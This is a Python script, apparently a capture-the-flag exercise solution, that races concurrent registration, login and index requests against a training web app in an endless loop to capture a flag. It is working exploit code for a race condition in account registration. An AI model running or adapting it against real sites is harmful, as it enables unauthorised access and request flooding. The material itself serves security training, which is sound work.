import requests
import string
import random
from threading import Thread
import time


URL = "http://meta.training.jinblack.it"

def registration(s, u, p1, p2):
    url = "%s/register.php" % (URL,)
    payload = {'username': u, 'password_1': p1, 'password_2': p2,'reg_user':True}
    r = s.post(url, data=payload)
    return r.text

def login(s, u, p):
    url = "%s/login.php" % (URL,)
    payload = {'username': u, 'password': p,'log_user':True}
    r = s.post(url, data=payload) 
    if "flag" in r.text:
        print(r.text)
    return r.text

def index(s):
    url = "%s/index.php" % (URL,)
    r = s.get(url)
    if "Name: Test Challenge" in r.text:
        print(r.text)  
    #return r.text

def randomString(N=10):
    return  ''.join(random.choice(string.ascii_lowercase + string.digits) for i in range(N))#''.join(random.choices(string.ascii_uppercase + string.digits, k=N))
'''
u = randomString()
p1 = u
p2 = u
reg = True
print(u, p1, p2,reg)
s = requests.Session()
registration(s,u,p1,p2)
print("#####################---@#")
login(s,u,p1)
r = index(s)
print("#####################---@#")
print(r)

'''
while True:
    s = requests.Session()
    u = randomString()
    p1 = u
    p2 = u
    print(u, p1, p2)
    
    t_logins = []
    t_reg = Thread(target=registration, args=[s,u,p1,p2])
    t_login = Thread(target=login, args=[s,u,p1])
    t_index = Thread(target=index, args=[s])
    t_reg.start()
    t_login.start()
    time.sleep(0.5)
    t_index.start()
    time.sleep(0.1)
    '''
    for i in range(2):
        t_logins.append(Thread(target=login, args=[s,u,p1]))
    t_reg.run()
    for i in range(2):
      t_logins[i].run()
    index(s)
    #time.sleep(0.1)
    '''